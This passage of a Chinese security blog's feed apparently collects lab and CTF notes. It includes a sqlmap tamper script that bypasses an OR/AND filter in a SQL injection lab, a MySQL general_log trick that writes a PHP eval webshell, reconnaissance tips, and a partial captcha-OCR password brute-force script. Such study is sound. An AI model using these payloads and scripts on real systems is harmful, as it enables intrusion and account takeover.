href="http://127.0.0.1/test.php?id=O:4:%22foo1%22:1:{s:4:%22varr%22;O:4:%22foo2%22:1:{s:3:%22str%22;s:10:%22phpinfo();%22:}}">http://127.0.0.1/test.php?id=O:4:%22foo1%22:1:{s:4:%22varr%22;O:4:%22foo2%22:1:{s:3:%22str%22;s:10:%22phpinfo();%22:}}</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/18.png" class="lazyload"></p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对php的一些深度的学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="/categories/python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap-tamper编写练习</title>
    <link href="/2019/07/01/sqlmap-tamper%E7%BC%96%E5%86%99%E7%BB%83%E4%B9%A0/"/>
    <id>/2019/07/01/sqlmap-tamper编写练习/</id>
    <published>2019-06-30T16:00:00.000Z</published>
    <updated>2019-07-08T16:51:28.836Z</updated>
    
    <content type="html"><![CDATA[<p>无聊练习一下，之前没写过。</p><a id="more"></a><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>语言：PHP</p><p>解析器和数据库：phpstudy</p><p>系统：Windows</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>看一下界面</p><p><img alt data-src="/images/sqlmap/1.png" class="lazyload"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-25</span> Trick with <span class="keyword">OR</span> &amp; <span class="keyword">AND</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:40px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//fiddling with comments</span></span><br><span class="line">$id= blacklist($id);</span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-25.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-25-1.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: Your Input is Filtered with following result: "</span>.$hint;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>分析：</p><p><strong><em>将变量$id通过url的get请求方式传入sql语句中，执行查询语句。<br>对URL键入的$id变量进行处理，使用PHP的内置函数preg_replace进行正则匹配将键入的$id变量的”or”和”and”替换成””</em></strong></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>考虑过大小写绕过，将”or”和”and”替换成”Or”和”And”，在数据库中操作是成功的</p><p><img alt data-src="/images/sqlmap/2.png" class="lazyload"></p><p>但是在web端操作的时候发现，preg_replace函数是不区分大小写的，它把’and’这个单词不管是大小写都替换成’’l了</p><p><img alt data-src="/images/sqlmap/3.png" class="lazyload"></p><h3 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h3><p>在数据库操作中，</p><p>and=&amp;&amp;</p><p>or=||</p><p><img alt data-src="/images/sqlmap/4.png" class="lazyload"></p><p><img alt data-src="/images/sqlmap/5.png" class="lazyload"></p><p>在web端操作</p><p><img alt data-src="/images/sqlmap/6.png" class="lazyload"></p><p>‘or’=’||’是可以的。</p><p><img alt data-src="/images/sqlmap/7.png" class="lazyload"></p><p>‘and’=’&amp;&amp;’在web端不成功，分析一下原因</p><p><strong>在php内’&amp;&amp;’为逻辑运算符，即是且，and的意思，他在传入php内已经被认为是逻辑运算符已经先被php执行了，就没传入sql语句中被sql执行了。</strong></p><p>于是我把’&amp;&amp;’进行url编码。就可以传入sql语句中成功执行了。</p><p><img alt data-src="/images/sqlmap/8.png" class="lazyload"></p><h2 id="tamper编写"><a href="#tamper编写" class="headerlink" title="tamper编写"></a>tamper编写</h2><h3 id="tamper写法规则"><a href="#tamper写法规则" class="headerlink" title="tamper写法规则"></a>tamper写法规则</h3><p>讲一下tamper的写法规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必须要导入的库</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="comment"># 定义该tamper脚本的优先级</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></span><br><span class="line"><span class="string">'''此处是tamper的说明'''</span></span><br><span class="line">retVal = payload</span><br><span class="line"><span class="comment"># 此处是用于修改payload的代码</span></span><br><span class="line"><span class="comment"># 返回修改后的payload</span></span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><h3 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h3><p>按照绕过规则写tamper：</p><p><strong>‘and’=’%26%26’</strong></p><p><strong>‘or’=’||’</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = re.sub(<span class="string">r"(OR)"</span>, <span class="string">"||"</span>, retVal)<span class="comment">#通过正则将OR替换成||</span></span><br><span class="line">    retVal = re.sub(<span class="string">r"(AND)"</span>, <span class="string">"%26%26"</span>, retVal)<span class="comment">#通过正则将AND替换成%26%26</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>执行一下试试：</p><p><img alt data-src="/images/sqlmap/9.gif" class="lazyload"></p><p><img alt data-src="/images/sqlmap/10.png" class="lazyload"></p><p>然后我们发现他执行sql的’ORD’函数的时候也把’OR’替换成’||’了。这时候我们就得换个思路了。</p><p><strong>再看一次规则：</strong></p><p><u><strong><em>他把’or’替换成’’</em></strong></u></p><p><u><strong><em>如果我们键入’oorr’，根据他的规则就会变成’or’，那我们的效果也达到。</em></strong></u></p><p>我们在web端尝试一下效果。</p><p><img alt data-src="/images/sqlmap/11.png" class="lazyload"></p><p>我们把这个思路写到tamper试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = re.sub(<span class="string">r"(OR)"</span>, <span class="string">"OORR"</span>, retVal)<span class="comment">#通过正则将OR替换成OORR</span></span><br><span class="line">    retVal = re.sub(<span class="string">r"(AND)"</span>, <span class="string">"%26%26"</span>, retVal)<span class="comment">#通过正则将AND替换成%26%26</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sqlmap/12.gif" class="lazyload"></p><p><img alt data-src="/images/sqlmap/13.png" class="lazyload"></p><p>成了！！！</p><p>试一下全部运行的结果。</p><p><img alt data-src="/images/sqlmap/14.gif" class="lazyload"></p><p>不过同理，把’AND’替换成’AANDND’，不过这里不尝试了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无聊练习一下，之前没写过。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="/categories/python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>getshell方式笔记</title>
    <link href="/2019/06/09/getshell%E6%96%B9%E5%BC%8F%E7%AC%94%E8%AE%B0/"/>
    <id>/2019/06/09/getshell方式笔记/</id>
    <published>2019-06-08T16:00:00.000Z</published>
    <updated>2019-06-09T14:22:58.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GetShell方式笔记"><a href="#GetShell方式笔记" class="headerlink" title="GetShell方式笔记"></a>GetShell方式笔记</h1><h2 id="PHPmyadmin-root权限开启log日志getshell"><a href="#PHPmyadmin-root权限开启log日志getshell" class="headerlink" title="PHPmyadmin root权限开启log日志getshell"></a>PHPmyadmin root权限开启log日志getshell</h2><p><strong><em>原理：利用phpmyadmin的sql执行日志的功能将一句话写入日志文件中</em></strong></p><p>前提：</p><ol><li>知道web的绝对路径</li><li>root权限</li><li>有写权限</li></ol><p><img alt data-src="/images/getshell%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/1.png" class="lazyload"></p><p>日志功能未开启。</p><p>代码如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>; <span class="comment">-- 开启日志功能</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'C:/Users/lf/phpstudy/PHPTutorial/WWW/wwwcmd.php'</span>; <span class="comment">-- 将日志文件保存在该路径下，日志文件为wwwcmd.php</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php @eval($_POST[x]);?&gt;'</span>; <span class="comment">-- 算sql语句，写入一句话</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/getshell%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/2.png" class="lazyload"></p><p><img alt data-src="/images/getshell%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/3.png" class="lazyload"></p><p><img alt data-src="/images/getshell%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/4.png" class="lazyload"></p><p>写shell成功。</p><p><img alt data-src="/images/getshell%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/5.png" class="lazyload"></p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;GetShell方式笔记&quot;&gt;&lt;a href=&quot;#GetShell方式笔记&quot; class=&quot;headerlink&quot; title=&quot;GetShell方式笔记&quot;&gt;&lt;/a&gt;GetShell方式笔记&lt;/h1&gt;&lt;h2 id=&quot;PHPmyadmin-root权限开启log日志g
      
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅谈信息收集</title>
    <link href="/2019/05/24/%E6%B5%85%E8%B0%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>/2019/05/24/浅谈信息收集/</id>
    <published>2019-05-23T16:00:00.000Z</published>
    <updated>2019-05-24T12:30:21.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈信息收集"><a href="#浅谈信息收集" class="headerlink" title="浅谈信息收集"></a>浅谈信息收集</h1><p>最近做了一点任务，也和大佬谈了一下，在任务中感受到，前期的信息收集在渗透过程中真的尤为重要，你信息收集的越全面，越完整，可以让你在渗透过程中，找到更多的思路，于是乎便有了这篇文章，我想在这篇文章中，一点一点积累一些信息收集的方式方法。</p><h2 id="移动端信息收集"><a href="#移动端信息收集" class="headerlink" title="移动端信息收集"></a>移动端信息收集</h2><p>也是刚接触，之前也没遇到过移动端的信息安全类的项目，但是最近碰到了，之前看见过一篇关于app渗透的文章，我看着很有意思，一直记着，我这里把连接发出来，记一下。</p><p><strong><em><a href="https://www.zhihu.com/question/264331588/answer/372634372?utm_source=qq&utm_medium=social&utm_oi=980405358078132224" title="黑客可以厉害到什么程度？">黑客可以厉害到什么程度？</a></em></strong></p><p>里面有一个关于app的渗透，通过配置好 burpsuite 代理，并开始用 wireshark 抓包进行流量分析。</p><p>获取app交互的web API的网址，然后搜集web的基本信息再进行渗透工作。</p><p>不过最近我使用的是另一个抓包工具，也是挺好用的。</p><h3 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h3><p><strong><em><a href="https://www.jianshu.com/p/724097741bdf" title="使用fiddler实现手机抓包">使用fiddler实现手机抓包</a></em></strong></p><p>不过和上面的大同小异。不过也是一个不错的方式。</p><h3 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h3><p>安装 </p><p>Packet Capture </p><p> 这个 App 直接在手机上做抓包应该是比较简单的：</p><ol><li>不需要 root（用 VPNService 这个接口实现的本地代理）</li><li>有 MITM Proxy，可以查看 https 流量（有这条还要什么三轮车&gt;_&lt;）</li><li>适用于不走系统代理的 App</li></ol><h2 id="app分析信息收集"><a href="#app分析信息收集" class="headerlink" title="app分析信息收集"></a>app分析信息收集</h2><p><strong><em><a href="https://blog.csdn.net/liumiaocn/article/details/80440977" title="移动端安全框架：MobSF：概要与使用">移动端安全框架：MobSF：概要与使用</a></em></strong></p><p>有时候遇到一些app，你没有账号密码登录进行使用里面的功能就很难确定他交互的ip或是web是哪个，这个也是在这几天遇到的。让人头疼。</p><p>然后当时就一个师兄提出来的拿去这个开源系统内分析，有直接可以下载的<em>docker</em> 镜像，他可以逆向出app的源码，将里面的信息提取出来，生成报告，这就可以从里面获取一些你想要的信息，在之前的任务中就找到app开发的时候需要使用的app证书，证书内有一个域名，当时猜测就是该app的交互的web端（存在这个可能性），后来发现是该app的开发商，也可以从app开发商入手，也行从开发商那里拿到app源码和web源码，进行白盒测试。</p><h2 id="web端信息搜集"><a href="#web端信息搜集" class="headerlink" title="web端信息搜集"></a>web端信息搜集</h2><p>那些whois什么的，包括操作系统，web语言，中间件什么的，都不想讲了，因为可能很多一找一些教程都会了，还有用法，还很详细，在这里只想记录一下关于这两次任务给我的一点启发。</p><h3 id="浅谈子域名搜集"><a href="#浅谈子域名搜集" class="headerlink" title="浅谈子域名搜集"></a>浅谈子域名搜集</h3><p>为什么就突然谈到子域名收集，因为其实我之前做子域名收集的时候，思维已经固定了，我一般通过两种方式收集</p><ol><li>子域名爆破</li><li>平台子域名收集</li></ol><p>子域名爆破，爆破的原理其实是通过枚举的方式来实现的（爆破域名顾名思义就是枚举的意思）<a href="https://www.secpulse.com/archives/tag/%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%90%8D">枚举域名</a>的A记录.</p><p>我感觉这种收集方式可能存在的问题是你枚举出来存在的域名不一定是目标的域名，所以可能即使你拿下了这个web，也是日歪了。</p><p>平台子域名收集，国内例如云悉平台，他做过收集，他给出的子域名大多都是准确无误的是你目标的，但是可能也存在平台收集的不全面的问题，经过这次任务，让我觉得前期的信息收集真的很重要，这次任务师兄也参与了，他也做了前期的信息收集，这次能在这个任务有所进展全靠他信息收集比我们更多，我们才能在这个任务中打开一个缺口。</p><p>我讲一下他收集子域名的方式。</p><p><img alt data-src="/images/%E6%B5%85%E8%B0%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.jpg" class="lazyload"></p><p>当时他就是通过第二个采集方法，找到了一个站点，其实我当时挺奇怪的，但是我乍得一看这个站点的子域名似乎和目标站点也不搭边，web的内容和信息似乎也不太有关联，当时抱着试一试的心态进行了渗透测试，结果进去以后发现竟然存在目标站点的源码和数据库备份文件还是当年近两个月的，当时让我蛮惊喜，也引发了我现在的思考。因为我是第一次深刻体验到信息收集在在渗透实战中产生的效果。我觉得可能是各大搜索引擎收入这些子域名信息的思路和我的思路不同吧。</p><p>于是乎我又去观看了一些关于子域名信息收集的方式，在freebuf找到一篇我觉得挺不错的，也记录一下在下面</p><p><strong><em><a href="https://www.freebuf.com/articles/web/117006.html" title="子域名搜集思路与技巧梳理">子域名搜集思路与技巧梳理</a></em></strong></p><p>后面再看看有什么关于信息收集方面的启发我在一点点的记录在这篇文章内</p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈信息收集&quot;&gt;&lt;a href=&quot;#浅谈信息收集&quot; class=&quot;headerlink&quot; title=&quot;浅谈信息收集&quot;&gt;&lt;/a&gt;浅谈信息收集&lt;/h1&gt;&lt;p&gt;最近做了一点任务，也和大佬谈了一下，在任务中感受到，前期的信息收集在渗透过程中真的尤为重要，你信息收集的越全
      
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Python之验证码识别爆破</title>
    <link href="/2019/05/02/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/"/>
    <id>/2019/05/02/python之验证码识别爆破/</id>
    <published>2019-05-02T04:00:00.000Z</published>
    <updated>2019-05-02T08:08:20.330Z</updated>
    
    <content type="html"><![CDATA[<p>一道比赛题目。</p><a id="more"></a><h1 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h1><p><img alt data-src="/images/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/1.png" class="lazyload"></p><p>三位数的密码。有个验证码。</p><ol><li>考虑是否js代码验证，是就在html界面删除js代码绕过</li><li>如果不是js代码验证，检测验证码的时效性，是否达到一次一用，如果不是可以保持验证码一直爆破</li></ol><p><img alt data-src="/images/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/2.png" class="lazyload"></p><p><img alt data-src="/images/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/3.png" class="lazyload"></p><p><strong>审题结果：三位数密码，验证码时效性为一次一用（已经确定223密码是错误的）</strong></p><h1 id="验证码识别-密码爆破"><a href="#验证码识别-密码爆破" class="headerlink" title="验证码识别+密码爆破"></a>验证码识别+密码爆破</h1><p>直接放代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shibie</span><span class="params">(count)</span>:</span></span><br><span class="line">    <span class="comment"># https://www.jianshu.com/p/60f7b65026fe 下载图片</span></span><br><span class="line">    src = <span class="string">'http://39.100.83.188:8002/vcode.php?tdsourcetag=s_pcqq_aiomsg'</span></span><br><span class="line">    r = requests.get(src)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'验证码.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">    <span class="comment"># https://www.cnblogs.com/yeayee/p/4955506.html  识别验证码</span></span><br><span class="line">    image = Image.open(<span class="string">'验证码.png'</span>)</span><br><span class="line">    vcode = pytesseract.image_to_string(image)</span><br><span class="line">    <span class="comment"># print("验证码：" + vcode)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tesseract-ocr的环境配置有点麻烦，教程在：https://blog.csdn.net/qq_37193537/article/details/81335165</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">'http://39.100.83.188:8002/login.php'</span></span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">'pwd'</span>: count,</span><br><span class="line">        <span class="string">'user_code'</span>: vcode,</span><br><span class="line">        <span class="string">'Login'</span>: <span class="string">"submit"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发送请求包</span></span><br><span class="line">    r = requests.request(<span class="string">"POST"</span>, url, data=payload)</span><br><span class="line">    r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">return</span> len(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 